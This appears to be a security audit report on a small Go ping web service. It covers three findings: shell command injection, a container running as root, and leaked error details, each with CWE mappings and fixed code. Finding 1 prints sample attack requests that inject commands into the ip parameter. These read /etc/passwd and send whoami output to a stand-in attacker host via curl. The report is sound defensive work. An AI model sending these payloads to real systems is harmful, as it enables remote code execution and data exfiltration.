## Finding 1: OS Command Injection

**File:** `main.go`
**Lines:** 19–19
**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
**OWASP Category:** A03:2021 – Injection
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** HIGH

### Vulnerable Code
```go
cmd := exec.Command("sh", "-c", fmt.Sprintf("ping -c 3 %s", ip))
```

### Description
The `ip` parameter is read directly from the HTTP query string (`r.URL.Query().Get("ip")`) and string-formatted into a shell command that is passed to `sh -c`. Because the shell interprets the entire argument as a command line, an attacker can append arbitrary shell metacharacters — semicolons, backticks, `$()` subshells, pipes, `&&`, `||` — to break out of the `ping` invocation and execute arbitrary OS commands as the process owner. There is no input validation, allowlist, or sanitization of any kind between the HTTP query parameter and the shell sink. A single unauthenticated HTTP request can achieve full remote code execution.

**Example exploit:**
```
GET /ping?ip=127.0.0.1;id HTTP/1.1
GET /ping?ip=127.0.0.1;cat%20/etc/passwd HTTP/1.1
GET /ping?ip=$(curl%20http://attacker.example/$(whoami))
```

### Prioritization
Highest priority finding. No preconditions beyond network access to port 5000 — directly exploitable by any unauthenticated attacker who can reach the service. Combined with the container running as root (Finding 2), a successful exploit yields full container compromise.

### Exploitability Notes
- **Exploit Preconditions:** Network access to port 5000; no authentication or rate limiting is present.
- **Uncertainty Boundary:** None. The data flow from `r.URL.Query()` → `fmt.Sprintf` → `exec.Command("sh", "-c", ...)` is explicit and unambiguous in the source.

### Remediation
Eliminate `sh -c` entirely. Use `exec.Command` with a structured argument list so the shell never parses user input. Additionally, validate that the input is a syntactically valid IP address before accepting it.

```go
import (
    "net"
    "os/exec"
)

func pingHandler(w http.ResponseWriter, r *http.Request) {
    ip := r.URL.Query().Get("ip")
    if ip == "" {
        http.Error(w, "Please provide an IP address", http.StatusBadRequest)
        return
    }

    // Allowlist validation: accept only valid IP addresses
    if net.ParseIP(ip) == nil {
        http.Error(w, "Invalid IP address", http.StatusBadRequest)
        return
    }

    // No shell: args are passed directly to execve, never interpreted by sh
    cmd := exec.Command("ping", "-c", "3", ip)
    output, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, "ping failed", http.StatusInternalServerError)
        return
    }

    w.WriteHeader(http.StatusOK)
    w.Write(output)
}
```

`net.ParseIP` rejects any string containing shell metacharacters (`;`, `$`, `|`, `&`, etc.) because those are not valid IP address characters. The `exec.Command` call with a flat arg list bypasses the shell entirely — even if `ip` contained metacharacters, they would be passed as a literal argument to `ping`, not interpreted.

## Finding 2: Container Process Runs as Root

**File:** `Dockerfile`
**Lines:** 1–28
**CWE:** CWE-250 — Execution with Unnecessary Privileges
**OWASP Category:** A05:2021 – Security Misconfiguration
**Priority:** P2
**Severity:** HIGH
**Confidence:** HIGH

### Vulnerable Code
```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y libc6 iputils-ping
COPY --from=builder /ping-app /ping-app
EXPOSE 5000
CMD ["/ping-app"]
# No USER directive — process runs as root (UID 0)
```

### Description
The Dockerfile contains no `USER` directive, so the `ping-app` process runs as UID 0 (root) inside the container. While containers provide namespace isolation, running as root dramatically amplifies the blast radius of any vulnerability — particularly the command injection in Finding 1. An attacker who exploits Finding 1 immediately obtains root-level shell access inside the container, enabling them to read all container secrets/environment variables, modify the filesystem, attempt container escape via kernel exploits or misconfigured mounts, pivot to other services on internal networks, and exfiltrate `/etc/shadow`, application credentials, and mounted secrets.

### Prioritization
P2 — secondary to Finding 1 (which is the exploitable entry point), but this finding directly multiplies its impact. Address together with Finding 1.

### Exploitability Notes
- **Exploit Preconditions:** Requires successful exploitation of Finding 1.
- **Uncertainty Boundary:** Impact depends on whether the container has `--privileged` mode, mounted host paths, or access to other services — not visible in the compose file, but the root baseline is confirmed by the Dockerfile alone.

### Remediation
Add a non-root `USER` directive. Since `ping` requires `CAP_NET_RAW`, use Linux capabilities instead of root:

```dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y libc6 iputils-ping && \
    useradd -r -u 1001 -g root appuser

COPY --from=builder /ping-app /ping-app

# Grant only the network capability required for ping, not full root
RUN setcap cap_net_raw+ep /usr/bin/ping

USER 1001

EXPOSE 5000
CMD ["/ping-app"]
```

## Finding 3: Internal Error Details Returned to Client

**File:** `main.go`
**Lines:** 22–24
**CWE:** CWE-209 — Generation of Error Message Containing Sensitive Information
**OWASP Category:** A05:2021 – Security Misconfiguration
**Priority:** P3
**Severity:** LOW
**Confidence:** HIGH

### Vulnerable Code
```go
if err != nil {
    http.Error(w, fmt.Sprintf("Error executing command: %v", err), http.StatusInternalServerError)
    return
}
```

### Description
When the `ping` command exits non-zero, the raw Go error value — which includes the OS-level error string and may include internal command details, filesystem paths, or exit status information — is formatted directly into the HTTP response body. While `ping` errors are relatively low-sensitivity, this pattern establishes a precedent for leaking internal details that could aid an attacker in enumerating the environment (e.g., confirming command execution, understanding system layout from error text). The `CombinedOutput()` return at line 20 also sends all of stdout+stderr to the client unconditionally, which will include raw ping output from injected commands.

### Prioritization
P3 — lowest priority. The command injection (Finding 1) is the dominant risk; this finding is only meaningful after that is fixed.

### Exploitability Notes
- **Exploit Preconditions:** Attacker must be able to trigger a ping failure (e.g., unreachable host, invalid IP format that `ping` still accepts).
- **Uncertainty Boundary:** Impact depends on how much internal detail Go's `exec` error strings expose in this OS/version.

### Remediation
Return a generic error message to the client and log the internal error server-side:

```go
if err != nil {
    log.Printf("ping command failed: %v", err)
    http.Error(w, "ping failed", http.StatusInternalServerError)
    return
}
```
